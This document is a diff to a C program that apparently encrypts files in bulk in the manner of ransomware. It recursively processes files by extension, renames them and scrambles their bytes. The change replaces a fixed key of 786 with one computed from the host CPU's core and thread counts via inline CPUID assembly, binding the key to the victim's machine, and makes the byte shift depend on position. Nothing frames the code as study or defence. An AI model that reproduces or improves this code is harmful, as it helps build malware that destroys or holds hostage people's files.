@@ -14,6 +14,7 @@ char randomByte();
 //void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
 //void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
 char* uuid4();
+int getkey();
 void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext);
 
 int main(int argc, char *argv[])
@@ -110,11 +111,11 @@ void endeda(int mode, const char* path_old, char* path_new, const char* fname, i
 				{
 					if (mode==2)
 					{
-						buffer[i]=buffer[i]+key-j;
+						buffer[i]=buffer[i]+key+i-j;
 					}
 					else
 					{
-						buffer[i]=buffer[i]-key+j;
+						buffer[i]=buffer[i]-key-i+j;
 					}
 					j--;
 				}
@@ -242,6 +243,16 @@ char* uuid4()
 	return NULL;
 }
 
+int getkey()
+{
+	unsigned int ncores=0,nthreads=0,ht=0;
+	asm volatile("cpuid": "=a" (ncores), "=b" (nthreads) : "a" (0xb), "c" (0x1) : );
+	ht=(ncores!=nthreads);
+	//printf("Cores: %d\nThreads: %d\nHyperThreading: %s\n",ncores,nthreads,ht?"Yes":"No");
+	//printf("It's %llu bit system\n", sizeof(void *) * 8);
+	return (ncores+nthreads+ht+(sizeof(void *) * 8));
+}
+
 void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext)
 {
     char path_old[PATH_SIZE];
@@ -291,7 +302,8 @@ void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath
 					continue;
 				}
 				
-				endeda(mode, path_old, path_new, dp->d_name, 786);
+				//endeda(mode, path_old, path_new, dp->d_name, 786);
+				endeda(mode, path_old, path_new, dp->d_name, getkey());
 				
 				//printf("%s\n", dp->d_name);
 				//printf("path_old : %s\n", path_old);
